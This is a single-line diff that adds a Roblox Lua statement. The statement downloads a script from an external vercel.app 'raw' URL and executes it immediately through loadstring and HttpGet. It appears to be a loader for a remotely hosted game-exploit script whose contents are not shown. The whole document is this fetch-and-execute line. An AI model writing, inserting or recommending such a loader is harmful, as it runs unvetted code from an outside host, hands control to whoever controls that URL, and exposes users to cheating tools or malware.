@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://sea-minh-protect.vercel.app/api/raw/1knm0lk9egis"))()
